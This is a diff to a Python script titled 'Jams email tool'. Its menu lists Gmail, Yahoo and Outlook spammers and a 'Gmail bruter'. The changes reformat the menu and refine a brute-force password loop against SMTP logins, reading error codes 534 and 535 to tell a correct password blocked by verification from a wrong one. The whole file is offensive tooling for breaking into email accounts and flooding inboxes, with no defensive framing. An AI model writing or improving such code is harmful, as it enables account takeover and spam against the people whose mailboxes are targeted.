@@ -46,13 +46,13 @@ print(Fore.BLUE + out)
 print("Jams email tool")
 print('''
 --Gmail tools--
-1)Gmail spammer
-2)Multi gmail spammer (Spam with multiple emails)
-3)Gmail bruter (BETA)
+[1] Gmail spammer
+[2] Multi gmail spammer (Spam with multiple emails)
+[3] Gmail bruter (BETA)
 --Yahoo tools--
-4)Yahoo spammer
+[4] Yahoo spammer
 --Outlook tools--
-5)Outlook spammer
+[5] Outlook spammer
 (More tools coming soon)
 ''')
 optionfirst = input("Enter option:")
@@ -145,12 +145,15 @@ if optionfirst == '3':
         try:
             server.login(user, password)
             print("[+] Password cracked!")
+            time.sleep(1)
             print("[!] " + password)
             time.sleep(100)
             server.quit()
-        except smtplib.SMTPAuthenticationError:
-            print("[-] Password Incorrect: " + password)
-
+        except smtplib.SMTPAuthenticationError as e:
+            if e.smtp_code == 534:
+                print("[-] Password Correct, email verification on: " + password)
+            elif e.smtp_code == 535:
+                print("[-] Password incorrect: " + password)
 if optionfirst == '4':
     clear()
     print(Fore.BLUE + outstand2)
